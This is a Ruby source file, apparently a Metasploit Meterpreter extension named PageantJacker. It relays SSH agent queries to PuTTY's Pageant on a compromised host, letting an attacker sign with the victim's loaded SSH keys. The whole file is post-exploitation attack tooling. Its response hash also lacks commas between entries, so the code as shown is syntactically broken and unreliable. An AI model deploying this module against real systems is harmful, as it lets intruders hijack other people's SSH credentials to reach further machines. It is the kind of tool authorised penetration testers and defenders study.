# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/pageantjacker/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module Pageantjacker

###
#
# PageantJacker extension - Hijack and interact with Pageant
#
# Stuart Morgan <stuart.morgan@mwrinfosecurity.com>
#
###

class Pageantjacker < Extension

  def initialize(client)
    super(client, 'pageantjacker')

    client.register_extension_aliases(
      [
        {
          'name' => 'pageantjacker',
          'ext'  => self
        },
      ])
  end

  def forward_to_pageant(blob,size)
        return unless size > 0
        return unless blob.size > 0
        #puts "Request indicated size: #{size}"
        #parse_blob(blob)

        # Create the packet
        packet_request = Packet.create_request('pageant_send_query')
        packet_request.add_tlv(TLV_TYPE_EXTENSION_PAGEANTJACKER_SIZE_IN, size)
        packet_request.add_tlv(TLV_TYPE_EXTENSION_PAGEANTJACKER_BLOB_IN, blob)
        
        response = client.send_request(packet_request)  
        return nil if !response

        pageant_plugin_response = {
            success: response.get_tlv_value(TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS)
            blob: response.get_tlv_value(TLV_TYPE_EXTENSION_PAGEANTJACKER_RETURNEDBLOB)
            error: response.get_tlv_value(TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE)
        }

        return pageant_plugin_response
  end

#  def parse_blob(blob)
#    b = blob.unpack('NCH*')
#    puts " blob size #{blob.size}"
#    puts " blob data (20 chars: #{blob.unpack('H20').first}"
#    puts "   ssh packet size: #{b[0]}"
#    puts "   ssh type: #{b[1]}"
#    puts "   ssh data: #{b[2]}"
#  end

#  def stop_listening
#  end

end

end; end; end; end; end

